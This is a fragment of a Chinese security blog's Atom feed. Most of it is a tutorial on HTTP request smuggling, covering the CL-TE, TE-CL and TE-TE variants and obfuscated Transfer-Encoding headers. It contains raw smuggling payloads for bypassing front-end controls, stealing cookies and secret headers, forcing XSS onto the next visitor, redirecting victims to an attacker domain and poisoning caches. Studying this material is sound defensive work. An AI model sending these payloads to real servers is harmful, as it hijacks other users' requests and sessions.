<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic()  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()         <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()         <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString()    <span class="comment">//把类当作字符串使用时触发,返回值需要为字符串</span></span><br><span class="line">__invoke()      <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和&lt;code&gt;phar://&lt;/code&gt;伪协议可以对phar文件进行读写等操作，如果 &lt;code&gt;phar.readonly&lt;/code&gt; 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="phar" scheme="https://hosch3n.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-08-16T14:29:15.000Z</published>
    <updated>2021-03-01T09:44:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）</p><p>一种是通过 <code>Content-Length</code> 请求头 的值界定请求体的长度，另一种是在<a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输</a>时，通过 <code>Transfer-Encoding: chunked</code> 请求头与请求体最后一行的 <code>0\r\n\r\n</code> 来标识该请求的结束(不计入请求体长度)</p><p>按照<a href="https://tools.ietf.org/html/rfc2616#section-4.4">HTTP/1.1规范标准</a>，这两种请求头同时存在时应该忽略 <code>Content-Length</code> 而以分块传输为准，但是对于反代链中的多个服务器而言，可能有些并不支持分块传输请求头、有些对于标准规范的实现并未足够精细，在处理一些畸形请求头时会有非预期的效果。</p><blockquote><p>为了方便表述，接下来均将用于反向代理的服务器称为前端，隐藏在反代服务器之后用于提供具体业务的服务器称为后端。用 <code>CL-TE</code> 表示前端以 <code>Content-Length</code> 作为请求结束界定标准、<code>TE-CL</code> 表示前端以 <code>Transfer-Encoding</code> 作为请求结束界定标准。</p></blockquote><p>HTTP请求走私漏洞正是由于前后端服务器界定标准不一致导致的，利用HTTP请求走私使得 <code>一次攻击</code> 在前端服务器识别为 <code>一个请求</code> ，但传送到后端服务器时其误认为这是用了<a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">pipelining</a>，而将其识别为 <code>两个不同的请求</code>。</p><ul><li>更深入的细节原理，涉及到反代和后端对于消息的处理机制，这部分现在还不懂，以后懂了再单独分析</li></ul><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端读取 <code>CL</code> 值为50，会将这一整段视为一个请求转发至后端( <code>0</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>后端接收时以 <code>TE</code> 作为界定标准，将 <code>0\r\n\r\n</code> 视为一个请求的结束，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的包结构并不完整，所以后端认为这份数据还没有接收完毕，会继续将随后到来的请求拼接进去</p></li><li><p>注意 <code>CL</code> 取值为50时，是截止到最后一行的最后一个字母 <code>t</code> 的，也就是说 <code>t</code> 后面并不存在 <code>\r\n</code> 这对回车换行符，那么后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=something</span><br></pre></td></tr></table></figure><p>这就导致了后续对 <code>/search</code> 的访问，因为请求行被吃进了 <code>X-Ignore</code> 这个请求头的值中，拼接后实际变成了对 <code>/404</code> 的访问。</p><p>从理论上来说，我们可以发出请求走私攻击包后，紧接着发送一个正常请求，根据后者不正常的响应差异来判断漏洞存在。</p><p>在实战中我们的攻击请求和紧接着发送的正常请求之间，很可能会有其他人的某个请求刚好插在了中间，这样我们本来期待用于判断漏洞的不正常响应就会被回复给别人，影响别人正常使的同时还会导致我们误以为没洞，所以最好避开高峰期多试几次。</p><ul><li>或者<a href="https://portswigger.net/web-security/request-smuggling/finding">基于响应时间来判断</a></li></ul><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端以 <code>TE</code> 作为界定标准，会将这一整段视为一个请求转发至后端( <code>q=something</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>前端读取 <code>CL</code> 值为13，认为第一个请求截止到 <code>q=something</code>，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的 <code>CL</code> 值为15，所以后端认为这份数据还没有接收完毕，会继续在随后到来的请求中取出5个字符拼接进去</p></li><li><p>后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">POST[空格]</span></span><br></pre></td></tr></table></figure><p>于是就使得后续请求被截断，剩下的不完整部分会被视为无效请求丢弃，最终会得到一个不正常的响应。（同样存在前文中说的竞争问题，缓解方法一样）</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>从原理来看前后端标准一致时是不存在请求走私的，但如果一个接受畸形 <code>TE</code> 认为是分块传输，一个不接受畸形 <code>TE</code> 而按照 <code>CL</code> 的值作为请求结束界定标准，这种细微差异同样会导致请求走私，PortSwigger 提供了部分在实战中成功利用过的畸形头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><ul><li>在<a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp插件</a>中存在更多畸形 <code>TE</code> 头用于Fuzz，可以自动计算 <code>CL</code> 长度和配合 <code>Turbo Intruder</code> 光速发包，真香</li></ul><p>利用畸形 <code>TE</code> 导致的差异化解析，最终还是会对应 <code>CL-TE</code> 或 <code>TE-CL</code> 的情况，就不再贴数据包了(就是改一下 <code>TE</code> 头)。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>最直接的就是用来绕过前端的安全访问控制，让走私的请求直达业务逻辑后端。但是实战中可能没有这么理想化，比如后端还是会校验 <code>client-ip</code> 、 <code>x-forwarded-for</code> 或是反代加的自定义请求头，这时就需要找到一个能够回显请求体参数的地方，利用请求走私中的第二个 <code>不完整</code> 请求吃掉紧接而来的下一个请求，通过直接或间接的回显读到需要的请求头。</p><p>比如在一个搜索功能中，POST请求的 <code>q</code> 参数的内容表示搜索的字符串，这个字符串在搜索页会被 <code>直接回显</code> 或是存储到搜索记录中 <code>间接回显</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 200</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=something</span><br></pre></td></tr></table></figure><p>重点注意第二个走私请求中 <code>CL</code> 值被设置得偏大，且有回显的 <code>q</code> 参数被移到了末尾，后端随后紧接而来的请求实际上会被拼接成这种样子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=somethingPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xx.net</span><br><span class="line"><span class="attribute">X-Secret-Header</span>: 666</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>...</code>中有多少内容取决于走私请求中 <code>CL</code> 值的大小，建议根据需要慢慢调大，避免过大导致超时(在这个例子中我们已经读到了需要的 <code>X-Secret-Header: 666</code> 这个前端服务器自定义校验头)，但是调大 <code>CL</code> 值能读到的东西最多截止到遇到 <code>&amp;</code> 时（想想HTTP请求用什么符号区分不同参数？我们能回显什么参数？）</p><p>至于这个 <code>随后紧接而来的请求</code> 该由我们发出，还是守株待兔等着别人的访问请求进坑，就要看具体的目的是什<br>么了。</p><h3 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h3><p>如果是想要打到别人的私有请求头(比如 <code>Cookie</code> 之类的)，那就得等人进坑且需要一个存储型的间接回显点，因为一次性的直接回显会直接响应给受害者，我们是看不到的。</p><ul><li>存储型间接回显点举例:搜索记录、个人简介、发布文章、发布评论、发送私信</li></ul><h3 id="水坑型XSS"><a href="#水坑型XSS" class="headerlink" title="水坑型XSS"></a>水坑型XSS</h3><p>如果实在没有存储型间接回显点的话，那就充分利用一次性直接回显这个特点，配合一个反射型XSS使其变为无条件触发的 <code>水坑型XSS</code> （我自己编的名）</p><ul><li>反射型XSS漏洞点可以是常规的GET或POST参数，同样也可以是像 <code>User-Agent</code> 头这种self触发点，因为结合请求走私我们可以实现将它强加给下一个访问的受害者</li></ul><h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>如果配合 <code>Apache</code> 和 <code>IIS</code> 会将无斜杠路径通过重定向方式添加斜杠的特性，就可以再次利用请求走私给下一个访问的受害者强加头部，通过重定向将其劫持到任意域名下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /evil HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/evil</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /a.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存投毒"><a href="#Web缓存投毒" class="headerlink" title="Web缓存投毒"></a>Web缓存投毒</h3><p>同时，对于 <code>/a.js</code> 的访问请求还可能被缓存下来，使得之后每个不受请求走私影响的后续请求，同样受到重定向劫持的影响，进一步造成Web缓存投毒：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/a.js</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存水坑"><a href="#Web缓存水坑" class="headerlink" title="Web缓存水坑"></a>Web缓存水坑</h3><p>回过头来，之前没找到回显点打敏感数据的话，也可以再再次利用请求走私给下一个访问的受害者强加头部，结合Web缓存特性将其敏感数据缓存下来窃取。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /getapikey HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getapikey</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /any.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line"><span class="attribute">Cookie</span>: sessionId=balabalabala</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>受害者的 <code>/getapikey</code> 中的信息会被缓存至 <code>/any.js</code> 中，但是一个问题是攻击者并不知道受害者是访问的 <code>/any.js</code>，所以可能需要遍历几乎所有静态文件分析= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）&lt;/p&gt;
&lt;p&gt;一种是通过 &lt;code&gt;Content-Length&lt;/code&gt; 请求头 的值界定请求体的长度，另一种是在&lt;a href=&quot;https://zh.wikip</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="http" scheme="https://hosch3n.github.io/tags/http/"/>
    
    <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
    
  </entry>
  
</feed>
